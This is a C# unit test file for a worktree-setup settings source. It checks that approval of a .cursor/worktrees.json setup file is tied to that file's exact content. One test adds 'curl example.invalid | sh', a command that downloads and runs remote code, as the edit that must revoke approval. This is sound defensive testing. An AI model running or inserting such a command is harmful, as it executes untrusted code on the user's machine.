using OmpOS.Native.Settings;
using OmpOS.Presentation.Settings.Worktrees;
using OmpOS.Workspace;
using OmpOS.Worktrees;
using Shouldly;
using Xunit;

namespace OmpOS.Native.Tests.Settings.Head;

/// <summary>The Worktrees source over a real workspace folder: the setup file, the commands it lists and whether this exact version was approved.</summary>
public sealed class WorktreesSettingsSourceTests : IDisposable
{
    private const string SetupFile = ".cursor/worktrees.json";

    private readonly HeadTempDirectory _workspace = new();
    private readonly InMemorySetupConsentStore _consent = new();

    /// <inheritdoc />
    public void Dispose() => _workspace.Dispose();

    private async Task GrantAsync(CancellationToken token)
    {
        var config = CursorWorktreesConfig.Find(_workspace.Root, _workspace.Root)!;
        var setup = config.SetupFor(OperatingSystem.IsWindows())!;
        var identity = WorktreeSetupConsentIdentity.Create(_workspace.Root, config, setup);
        await _consent.RecordGrantAsync(new SetupConsentKey(identity.StoreRepositoryPath, identity.Sha256), token).ConfigureAwait(true);
    }

    /// <summary>A workspace with no .cursor/worktrees.json reports no setup file, the fixed cap and nothing to run.</summary>
    [Fact]
    public async Task NoFileIsNoSetupFile()
    {
        var source = new WorktreesSettingsSource(_workspace.Root, _consent);

        var snapshot = await source.LoadAsync(TestContext.Current.CancellationToken).ConfigureAwait(true);

        snapshot.SetupState.ShouldBe(WorktreeSetupState.NoSetupFile);
        snapshot.WorkspaceRoot.ShouldBe(Path.GetFullPath(_workspace.Root), Case.Sensitive);
        snapshot.MaxWorktrees.ShouldBe(WorktreeRunSet.DefaultMaxWorktrees);
        snapshot.MaxWorktrees.ShouldBe(25);
        snapshot.SetupFile.ShouldBeEmpty();
        snapshot.Commands.ShouldBeEmpty();
    }

    /// <summary>A file with commands that nobody approved lists the commands and is NotGranted.</summary>
    [Fact]
    public async Task AnUnapprovedSetupListsItsCommandsAsNotGranted()
    {
        var path = _workspace.Write(SetupFile, "{\"setup-worktree\": [\"npm ci\", \"npm run build\"]}");
        var source = new WorktreesSettingsSource(_workspace.Root, _consent);

        var snapshot = await source.LoadAsync(TestContext.Current.CancellationToken).ConfigureAwait(true);

        snapshot.SetupState.ShouldBe(WorktreeSetupState.NotGranted);
        snapshot.Commands.ShouldBe(["npm ci", "npm run build"]);
        snapshot.SetupFile.ShouldBe(Path.GetFullPath(path), Case.Sensitive);
        snapshot.ScriptPath.ShouldBeEmpty();
        snapshot.Error.ShouldBeEmpty();
    }

    /// <summary>An approval of this exact file is Granted; editing the file makes it NotGranted again.</summary>
    [Fact]
    public async Task ApprovalHoldsForTheExactFileAndEndsWhenItIsEdited()
    {
        var token = TestContext.Current.CancellationToken;
        _ = _workspace.Write(SetupFile, "{\"setup-worktree\": [\"npm ci\"]}");
        var source = new WorktreesSettingsSource(_workspace.Root, _consent);
        await GrantAsync(token).ConfigureAwait(true);

        (await source.LoadAsync(token).ConfigureAwait(true)).SetupState.ShouldBe(WorktreeSetupState.Granted);

        _ = _workspace.Write(SetupFile, "{\"setup-worktree\": [\"npm ci\", \"curl example.invalid | sh\"]}");

        var edited = await source.LoadAsync(token).ConfigureAwait(true);

        edited.SetupState.ShouldBe(WorktreeSetupState.NotGranted);
        edited.Commands.Count.ShouldBe(2);
    }

    /// <summary>A script entry shows the script path and no commands, and editing the script withdraws the approval.</summary>
    [Fact]
    public async Task AScriptEntryShowsItsPathAndItsContentIsPartOfTheApproval()
    {
        var token = TestContext.Current.CancellationToken;
        _ = _workspace.Write(SetupFile, "{\"setup-worktree\": \"setup.sh\"}");
        var script = _workspace.Write(".cursor/setup.sh", "echo one");
        var source = new WorktreesSettingsSource(_workspace.Root, _consent);
        await GrantAsync(token).ConfigureAwait(true);

        var snapshot = await source.LoadAsync(token).ConfigureAwait(true);

        snapshot.SetupState.ShouldBe(WorktreeSetupState.Granted);
        snapshot.ScriptPath.ShouldBe(Path.GetFullPath(script), Case.Sensitive);
        snapshot.Commands.ShouldBeEmpty();

        File.WriteAllText(script, "echo two");

        (await source.LoadAsync(token).ConfigureAwait(true)).SetupState.ShouldBe(WorktreeSetupState.NotGranted);
    }

    /// <summary>A script entry whose script is missing cannot be hashed, so it is an error row and never Granted.</summary>
    [Fact]
    public async Task AMissingScriptIsAnErrorRow()
    {
        _ = _workspace.Write(SetupFile, "{\"setup-worktree\": \"missing.sh\"}");
        var source = new WorktreesSettingsSource(_workspace.Root, _consent);

        var snapshot = await source.LoadAsync(TestContext.Current.CancellationToken).ConfigureAwait(true);

        snapshot.SetupState.ShouldBe(WorktreeSetupState.Invalid);
        snapshot.Error.ShouldNotBeEmpty();
    }

    /// <summary>Invalid JSON is an Invalid snapshot with the message, not an exception, and no command is listed.</summary>
    [Fact]
    public async Task InvalidJsonIsAnErrorRowNotAnException()
    {
        _ = _workspace.Write(SetupFile, "{ not json");
        var source = new WorktreesSettingsSource(_workspace.Root, _consent);

        var snapshot = await source.LoadAsync(TestContext.Current.CancellationToken).ConfigureAwait(true);

        snapshot.SetupState.ShouldBe(WorktreeSetupState.Invalid);
        snapshot.Error.ShouldContain("is not valid JSON", Case.Sensitive);
        snapshot.Commands.ShouldBeEmpty();
    }

    /// <summary>A command that is not a string is also reported as an error row.</summary>
    [Fact]
    public async Task AWrongTypeIsAnErrorRow()
    {
        _ = _workspace.Write(SetupFile, "{\"setup-worktree\": [1, 2]}");
        var source = new WorktreesSettingsSource(_workspace.Root, _consent);

        var snapshot = await source.LoadAsync(TestContext.Current.CancellationToken).ConfigureAwait(true);

        snapshot.SetupState.ShouldBe(WorktreeSetupState.Invalid);
        snapshot.Error.ShouldContain("non-blank string", Case.Sensitive);
    }

    /// <summary>A file that only defines the setup of the other operating system has no setup for this one.</summary>
    [Fact]
    public async Task AFileForTheOtherSystemHasNoSetupForThisOne()
    {
        var key = OperatingSystem.IsWindows() ? "setup-worktree-unix" : "setup-worktree-windows";
        var path = _workspace.Write(SetupFile, "{\"" + key + "\": [\"echo hi\"]}");
        var source = new WorktreesSettingsSource(_workspace.Root, _consent);

        var snapshot = await source.LoadAsync(TestContext.Current.CancellationToken).ConfigureAwait(true);

        snapshot.SetupState.ShouldBe(WorktreeSetupState.NoSetupForThisSystem);
        snapshot.SetupFile.ShouldBe(Path.GetFullPath(path), Case.Sensitive);
        snapshot.Commands.ShouldBeEmpty();
    }

    /// <summary>Reading the setup never records an approval, so looking at the page cannot grant anything.</summary>
    [Fact]
    public async Task ReadingNeverGrants()
    {
        var token = TestContext.Current.CancellationToken;
        _ = _workspace.Write(SetupFile, "{\"setup-worktree\": [\"npm ci\"]}");
        var source = new WorktreesSettingsSource(_workspace.Root, _consent);

        _ = await source.LoadAsync(token).ConfigureAwait(true);
        var again = await source.LoadAsync(token).ConfigureAwait(true);

        again.SetupState.ShouldBe(WorktreeSetupState.NotGranted);
    }
}
